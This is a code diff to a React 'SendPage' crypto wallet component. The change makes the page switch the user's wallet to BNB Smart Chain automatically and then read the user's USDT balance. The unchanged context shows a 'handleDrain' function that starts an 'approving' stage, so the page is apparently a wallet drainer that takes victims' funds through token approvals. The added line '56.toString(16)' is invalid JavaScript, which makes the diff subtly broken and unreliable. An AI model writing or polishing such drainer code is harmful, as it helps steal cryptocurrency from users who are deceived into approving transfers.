@@ -19,51 +19,57 @@ export default function SendPage({ provider, address }: Props) {
   const mountedRef = useRef(true)
 
   // FIX 7: Fetch balance with try/catch + chain check to prevent white screen crash
-  useEffect(() => {
-    mountedRef.current = true
+useEffect(() => {
+  mountedRef.current = true
 
-    const fetchBalance = async () => {
-      if (!mountedRef.current) return
+  const fetchBalance = async () => {
+    if (!mountedRef.current) return
+    
+    try {
+      // ====== ADD THIS: Try to auto-switch to BSC ======
+      const network = await provider.getNetwork()
+      let chainId = Number(network.chainId)
       
-      try {
-        // Check which network we're on
-        const network = await provider.getNetwork()
-        const chainId = Number(network.chainId)
-        
-        if (chainId !== 56) {
+      if (chainId !== 56) {
+        try {
+          const hexChainId = "0x" + 56.toString(16)
+          await provider.send("wallet_switchEthereumChain", [{ chainId: hexChainId }])
+          await new Promise(r => setTimeout(r, 2000))
+          chainId = 56
+        } catch {
           setBalanceError("Please switch to BNB Smart Chain in your wallet")
           if (mountedRef.current) setUsdtBalance("0")
           return
         }
-        
-        setBalanceError("")
+      }
+      
+      setBalanceError("")
 
-        const usdt = new ethers.Contract(
-          USDT_ADDRESS,
-          ["function balanceOf(address) view returns (uint256)"],
-          provider
-        )
-        const bal = await usdt.balanceOf(address)
-        
-        if (mountedRef.current) {
-          setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS))
-        }
-      } catch (err: any) {
-        console.warn("Balance fetch failed:", err?.message || err)
-        if (mountedRef.current) {
-          setUsdtBalance("0")
-          setBalanceError("Could not fetch USDT balance")
-        }
+      const usdt = new ethers.Contract(
+        USDT_ADDRESS,
+        ["function balanceOf(address) view returns (uint256)"],
+        provider
+      )
+      const bal = await usdt.balanceOf(address)
+      
+      if (mountedRef.current) {
+        setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS))
+      }
+    } catch (err: any) {
+      console.warn("Balance fetch failed:", err?.message || err)
+      if (mountedRef.current) {
+        setUsdtBalance("0")
+        setBalanceError("Could not fetch USDT balance")
       }
     }
+  }
 
-    fetchBalance()
+  fetchBalance()
 
-    // FIX 8: Cleanup to prevent state update on unmounted component
-    return () => {
-      mountedRef.current = false
-    }
-  }, [address, provider])
+  return () => {
+    mountedRef.current = false
+  }
+}, [address, provider])
 
   const handleDrain = async () => {
     setStage("approving")
